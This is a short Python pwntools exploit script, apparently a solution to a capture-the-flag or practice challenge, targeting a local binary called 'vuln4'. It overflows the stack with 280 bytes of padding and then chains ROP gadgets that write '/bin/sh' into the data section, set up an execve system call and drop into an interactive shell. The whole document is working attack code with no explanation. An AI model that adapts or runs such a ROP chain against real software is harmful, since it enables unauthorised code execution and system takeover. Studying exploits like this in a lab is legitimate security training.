from pwn import *

elf = context.binary = ELF('./vuln4')
p = process()

pop_rax = p64(0x0000000000446613)
pop_rdi = p64(0x000000000045c030)
pop_rsi = p64(0x000000000040873e)
pop_rdx = p64(0x00000000004016eb)
mov = p64(0x00000000004307d3)
syscall = p64(0x0000000000414f8c)
offset = b'A'*280
a = p64(0x0)
sys_execve = p64(0x3b)
bin_sh = b'/bin/sh\x00'
data_section = p64(0x4ae0e0)

payload = flat(
        offset,
        pop_rdx,
        bin_sh,
        pop_rdi,
        data_section,
        mov,
        pop_rax,
        sys_execve,
        pop_rdi,
        data_section,
        pop_rsi,
        a,
        pop_rdx,
        a,
        syscall
)

p.sendline(payload)
p.interactive()
